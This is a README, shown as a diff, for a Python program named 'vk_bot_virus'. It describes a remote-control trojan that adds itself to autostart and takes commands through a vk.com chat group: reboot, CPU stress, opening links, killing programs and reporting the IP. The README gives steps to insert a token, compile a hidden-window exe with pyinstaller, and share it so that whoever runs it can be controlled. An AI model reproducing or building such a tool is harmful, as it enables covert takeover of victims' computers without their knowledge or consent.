@@ -1,0 +1,31 @@
+Exe program written on python. When downloading the file is moved to autoload. Makes it possible to control the computer using chat in vk.com 
+
+ 
+
+functions:
+     1)reboot - "reboot"
+     2)decrease computer performance - "stress" after comma duration in seconds
+     3)open links - "open"  after comma input link
+     4)close programs "close" after comma input with file permission
+     5)request ip - "ip"
+
+
+
+That were used:
+	vk_api,random,time,requests,os,psutil,getpass,shutil 
+	subprocess,time,subprocess,vk_api.keyboard,webbrowser  
+
+
+#! Before convert from py to exe imput your group token from vk.com in 20 string #!
+
+After downloading the file from git you need to put your vk group token in python file and convert file from .py to .exe
+	To convert this file you need to install pyinstaller :
+		cmd> cd "and yours directory with vk_bot_virus"
+ 		cmd> pyinstaller -F -w vk_bot_virus.py
+
+You will get several folders but vk_bot_virus with exe file permission only in "dist" folder
+open it  and one more folder after it you will see mant files among which will be vk_bot_virus.exe   
+
+
+
+Now you can share it.  And if someone runs this file then you can control his computer.
